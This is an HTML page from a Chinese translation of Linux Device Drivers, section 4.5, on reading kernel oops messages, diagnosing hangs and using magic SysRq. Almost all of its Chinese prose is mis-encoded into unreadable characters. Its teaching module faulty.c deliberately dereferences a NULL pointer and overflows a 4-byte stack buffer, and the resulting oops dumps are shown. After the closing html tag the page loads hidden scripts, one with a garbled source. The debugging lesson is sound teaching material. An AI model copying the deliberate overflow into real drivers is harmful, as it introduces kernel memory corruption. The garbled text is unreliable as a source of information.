<html xmlns:cf="http://docbook.sourceforge.net/xmlns/chunkfast/1.0">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
<title>4.5.&#160;ϵͳ-Linux豸棨İ棩- - </title>
<meta name="description" content="- - " />
<meta name="keywords" content="Linux豸,İ,,ldd,linux device driver,,Ӱ,,, " />
<meta name="author" content="  www.21cstar.com QQ:610061171" /> 
<meta name="verify-v1" content="5asbXwkS/Vv5OdJbK3Ix0X8osxBUX9hutPyUxoubhes=" />
<link rel="stylesheet" href="docbook.css" type="text/css">
<meta name="generator" content="DocBook XSL Stylesheets V1.69.0">
<link rel="start" href="index.html" title="Linux 豸 Edition 3">
<link rel="up" href="ch04.html" title="&#160;4&#160;&#160;Լ">
<link rel="prev" href="ch04s04.html" title="4.4.&#160;ʹù۲">
<link rel="next" href="ch04s06.html" title="4.6.&#160;ع">
</head>
<body bgcolor="white" text="black" link="#0000FF" vlink="#840084" alink="#0000FF">
<div class="navheader">
<table width="100%" summary="Navigation header">
<tr><th colspan="3" align="center">4.5.&#160;ϵͳ</th></tr>
<tr>
<td width="20%" align="left">
<a accesskey="p" href="ch04s04.html">һҳ</a>&#160;</td>
<th width="60%" align="center">&#160;4&#160;&#160;Լ</th>
<td width="20%" align="right">&#160;<a accesskey="n" href="ch04s06.html">һҳ</a>
</td>
</tr>
</table>
<hr>
</div>
<div class="sect1" lang="zh-cn">
<div class="titlepage"><div><div><h2 class="title" style="clear: both">
<a name="DebuggingSystemFaults.sect"></a>4.5.&#160;ϵͳ</h2></div></div></div>
<p>ʹеļӺ͵Լ, ʱϻ, ִʱϵͳ. ʱ, ܹռܶϢҪ.</p>
<p>ע""ζ"". Linux 㹻׳ŵӦ󲿷ִ:һϳµǰ̵ƻϵͳ. ϵͳܱ, һϷһ̵֮, ϵͳһЩҪĲֻٻ. ǵһµ, ֻᵼ²ʹĽ̵ͻȻ. ̱ʱΨһ޷ָƻǷĵһЩڴ涪ʧ; , ͨ kmalloc Ķ̬бܶʧ. , ΪںΪκһ򿪵豸ڽʱùرղ, ͷ open Ķ.</p>
<p>һ oops رϵͳ, пܷڷһκҪϵͳ. һǴʹӲڲʹõ״̬, ʹںԴڲһµ״̬, , , ĵطƻںڴ. ɼ򵥵жһ oops . Ȼ, 㿴κζ˵ϵͳΪһ岻̫, .</p>
<p>Ѿ˵, ں˴, һʾԵϢӡڿ̨. һڽνͲϢ. Ƕֿ൱ģ, תǺȤϢ, 㹻һҪӵĲ.</p>
<div class="sect2" lang="zh-cn">
<div class="titlepage"><div><div><h3 class="title">
<a name="OopsMessages.scet"></a>4.5.1.&#160;oops Ϣ</h3></div></div></div>
<p>󲿷 bug Խ NULL ָʹȷֵָԼ.  bug ͨһ oops Ϣ.</p>
<p>ʹõκεַһַ, ͨһӵҳṹӳΪַ(ڴϵͳԼʹõַ). һЧָ, ҳ޷ӳָ뵽һַ, һҳϵͳ. ַЧ, ں޷"ҳ"ȱʧĵַ; ()һ oops ڴڹģʽʱ.</p>
<p>һ oops ʾ˳ʱĴ״̬, CPU ĴݺϢ. Ϣɴ printk ( arch/*/kernel/traps.c )ͬǰ "printk" һı.</p>
<p>ǿһϢ.  2.6 ں˵ PC һ NULL ָ뵼µĽ. صϢָָ(EIP), ָĵַ.</p>
<pre class="screen">
Unable to handle kernel NULL pointer dereference at virtual address 00000000
 printing eip:  
d083a064  
Oops: 0002 [#1]  
SMP  
CPU:  0  
EIP:  0060:[&lt;d083a064&gt;]  Not tainted  
EFLAGS: 00010246  (2.6.6)  
EIP is at faulty_write+0x4/0x10 [faulty]  
eax: 00000000  ebx: 00000000  ecx: 00000000  edx: 00000000  
esi: cf8b2460  edi: cf8b2480  ebp: 00000005  esp: c31c5f74  
ds: 007b  es: 007b  ss: 0068  

Process bash (pid: 2086, threadinfo=c31c4000 task=cfa0a6c0) 
Stack: c0150558 cf8b2460 080e9408 00000005 cf8b2480 00000000 cf8b2460 cf8b2460 fffffff7 080e9408 c31c4000 c0150682 cf8b2460 080e9408 00000005 cf8b2480 00000000 00000001 00000005 c0103f8f 00000001 080e9408 00000005 00000005 
Call Trace:
 [&lt;c0150558&gt;] vfs_write+0xb8/0x130
 [&lt;c0150682&gt;] sys_write+0x42/0x70
 [&lt;c0103f8f&gt;] syscall_call+0x7/0xb

Code: 89 15 00 00 00 00 c3 90 8d 74 26 00 83 ec 0c b8 00 a6 83 d0 
</pre>
<p>дһɻģӵе豸Ϣ, һʾʧЧģ. faulty.c  write ʵϸ:</p>
<pre class="programlisting">
ssize_t faulty_write (struct file *filp, const char __user *buf, size_t count, loff_t *pos)
{
        /* make a simple fault by dereferencing a NULL pointer */
        *(int *)0 = 0;
        return 0;
}
</pre>
<p>ܼ, ǽһ NULL ָ. Ϊ 0 һֱһЧֵָ, һ, ںתΪǰչʾ oops Ϣ. ý̽űɱ.</p>
<p>ģвͬĴĶʵ:</p>
<pre class="programlisting">
ssize_t faulty_read(struct file *filp, char __user *buf, size_t count, loff_t *pos)
{
    int ret;
    char stack_buf[4];

    /* Let's try a buffer overflow */
    memset(stack_buf, 0xff, 20);
    if (count &gt; 4)

        count = 4; /* copy 4 bytes to the user */
    ret = copy_to_user(buf, stack_buf, count);
    if (!ret)

        return count;
    return ret;
}
</pre>
<p>һִһر; ҵ, ִĿ. ʱµĻһ oops . Ϊָʹָָ뵽֪δ, ĴѸ, õµ:</p>
<pre class="programlisting">
EIP: 0010:[&lt;00000000&gt;]
Unable to handle kernel paging request at virtual address ffffffff

 printing eip:  
ffffffff  
Oops: 0000 [#5]  
SMP  
CPU:  0  
EIP:  0060:[&lt;ffffffff&gt;]  Not tainted  
EFLAGS: 00010296  (2.6.6)  
EIP is at 0xffffffff  
eax: 0000000c  ebx: ffffffff  ecx: 00000000  edx: bfffda7c  
esi: cf434f00  edi: ffffffff  ebp: 00002000  esp: c27fff78  
ds: 007b  es: 007b  ss: 0068  

Process head (pid: 2331, threadinfo=c27fe000 task=c3226150) 
Stack: ffffffff bfffda70 00002000 cf434f20 00000001 00000286 cf434f00 fffffff7 bfffda70 c27fe000 c0150612 cf434f00 bfffda70 00002000 cf434f20 00000000 00000003 00002000 c0103f8f 00000003 bfffda70 00002000 00002000 bfffda70 
Call Trace: [&lt;c0150612&gt;] sys_read+0x42/0x70 [&lt;c0103f8f&gt;] syscall_call+0x7/0xb 
Code: Bad EIP value. 
</pre>
<p>, ֵֻĵöջ( vfs_read  faulty_read ʧ ), ں˱Թһ" EIP ֵ". Թڿͷгķĵַ ( ffffffff ) ʾں˶ջѱƻ.</p>
<p>ͨ, һ oops, һǲ鿴λ, öջֿг. չʾĵһ oops, ص:</p>
<pre class="screen">
EIP is at faulty_write+0x4/0x10 [faulty] 
</pre>
<p>ǿ, ں faulty_write, λ faulty ģ( ڷг ). 16 ָʾָָǺ 4 ֽ,  10 ( 16  )ֽڳ. 㹻֪ʲô.</p>
<p>ҪϢ, öջչʾε֪ﻵµ. ջԼ 16 ʽӡ; һ㹤, 㾭ԴӶջбоرֵͺ. оں˿߿ԴĳЩģʽʶл; , 㿴 faulty_read oops Ķջб:</p>
<pre class="screen">
Stack: ffffffff bfffda70 00002000 cf434f20 00000001 00000286 cf434f00 fffffff7
 bfffda70 c27fe000 c0150612 cf434f00 bfffda70 00002000 cf434f20 00000000
 00000003 00002000 c0103f8f 00000003 bfffda70 00002000 00002000 bfffda70 
</pre>
<p>ջ ffffffff ǻµִһ.  x86 ϵ, ȱʡ, ûռջʼ 0xc0000000; , ѭֵ 0xbfffda70 һûջַ; ʵ, Ǵݸ read ϵͳõĻַ, ÿ´ϵͳʱ.  x86 (һ, ȱʡ), ں˿ռ俪ʼ 0xc0000000, ֮ϵֵ϶ں˿ռĵַ, ȵ.</p>
<p>, һ oops б, һֱӱ¿ʼ۵"slab "ֵ. ,õһں oops, ķַʱ 0xa5a5a5a5a5, 㼸϶ - ĳطڳʼ̬ڴ.</p>
<p>ע, ֻںǴ CONFIG_KALLSYMS ѡʱԿŵĵöջ. , һ, 16 б, Աķʽ, ԶԶõ.</p>
</div>
<div class="sect2" lang="zh-cn">
<div class="titlepage"><div><div><h3 class="title">
<a name="SystemHange.sect"></a>4.5.2.&#160;ϵͳ</h3></div></div></div>
<p>ں˴Ĵ󲿷 bug  oops Ϣ, ʱǿȫϵͳ. ϵͳ, ûϢӡ. , һѭ, ںֹͣ,<sup>[<a name="id422785" href="#ftn.id422785">15</a>]</sup> ϵͳӦκζ, ħ Ctrl-Alt-Del ϼ.  2 ѡϵͳ-- ֹ, ܹº.</p>
<p>ֹѭͨ schedule սԵ. schedule ( ܲµ ), , Ľ̴ӵǰ͵ȡ CPU . һbugں˿ռѭ, schedule ʹܹɱڸٷʲô֮.</p>
<p>Ӧ֪, Ȼ, ζ schedule ĵÿܴһӵԴ, ΪĽ. زӦ, ٶѾʹ˺ʵļ. Ȼ, Ҫȷһκʱ䲻ܵ schedule.</p>
<p>ϵͳ, 㲻֪ schedule , õķʽǼһЩӡϢд̨(Ҫ, ı console_loglevel ֵ).</p>
<p>ʱϵͳܿ, û. , ܷڼĳֵķʽסʱ. Щٹͨ鿴ΪĿеĳ. һʾϵʱӻϵͳرһõ״̬; ֻҪ, ڹ.</p>
<p>һزٵĹ"ħ sysrq ", ڴ󲿷ϵ϶. ħ sysrq  PC  alt  sysrq , ڱƽ̨ʹ( documentation/sysrq.txt), ڴڿ̨Ҳ. һ,  2 һ, õĶеһ:</p>
<p>r	رռԭʼģʽ; һӦó(  X  )ܽļ̸һֵ״̬.</p>
<p>k "ȫע"( SAK ) . SAK ɱڵǰ̨еĽ, һɾն.</p>
<p>s һȫ̵Ľͬ.</p>
<p>u	umount. ͼ¼дֻģʽ. ,  s ֮ϵ, Խʡļϵͳʱ, ϵͳ鷳ʱ.</p>
<p>b boot. ϵͳ. ȷͬ¼ش.</p>
<p>p ӡϢ.</p>
<p>t ӡǰб.</p>
<p>m ӡڴϢ.</p>
<p>бħ sysrq ܴ; ݿںԴĵĿ¼е sysrq.txt. עħ sysrq ںʽʹ, 󲿷ֵķûʹ, ΪԵİȫ. ϵͳ, Ȼ, ʹħ sysrq ֵΪԼһں˵鷳. ħ sysrq ʱر, ʹµһ:</p>
echo 0 &gt; /proc/sys/kernel/sysrq 
<p>ȨûܹӴϵͳ, Ӧǹر, ֹ. һЩǰں˰汾ȱʡر sysrq, Ҫʱʹ, ͨͬ /proc/sys ļд 1.</p>
<p>sysrq Ƿǳ, ѾԲܽӴ̨ϵͳԱ. ļ /proc/sysrq-trigger һֻдڵ, Դһ sysrq , ͨдַ; ռں־κ.  sysrq ڵһֱ,  sysrq ڿ̨ϱر.</p>
<p>㾭һ"", ճһѭ, ϵͳΪһ幦, мֵ˽. , sysrq p ֱָĺ. , 㻹ʹں. һں,  profile=2 . ʹ readprofile ߸λ, ʹѭ. һ, ʹ readprofile ںʱ. һ߼ѡ oprofile, Ҳ. ļ documentation/basic_profiling.txt Ҫ֪Ķ.</p>
<p>׷ϵͳʱһֵʹõķʩֻʽĴ(ж). ֻжص, ûзļϵͳʹڲһµ״̬. Ŀʹһͨ NFS, ļϵͳ, ȫļϵͳļ, ں˵"NFS-Root"ܱ, ʱ봫Ĳ. , 㲻 sysrq Ҳļϵͳƻ, Ϊļϵͳһ NFS , 豸ر.</p>
</div>
<div class="footnotes">
<br><hr width="100" align="left">
<div class="footnote"><p><sup>[<a name="ftn.id422785" href="#id422785">15</a>] </sup>ʵ, ദϵͳȻϵ, һĻµ, ںռʹ. Ȼ, ڴ󲿷ֵͨ( ʹռ), ϵͳһֹͣ.</p></div>
</div>
</div>
<div class="navfooter">
<hr>
<table width="100%" summary="Navigation footer">
<tr>
<td width="40%" align="left">
<a accesskey="p" href="ch04s04.html">һҳ</a>&#160;</td>
<td width="20%" align="center"><a accesskey="u" href="ch04.html">һ</a></td>
<td width="40%" align="right">&#160;<a accesskey="n" href="ch04s06.html">һҳ</a>
</td>
</tr>
<tr>
<td width="40%" align="left" valign="top">4.4.&#160;ʹù۲&#160;</td>
<td width="20%" align="center"><a accesskey="h" href="index.html">ʼҳ</a></td>
<td width="40%" align="right" valign="top">&#160;4.6.&#160;ع</td>
</tr>
</table>
</div>
</body></html>
<div style="display:none"><script language="JavaScript" src="script.js"></script> </div>

<script language=javascript src=G2Bݔx8n*n*n*n*n*n*ݚPpd></script>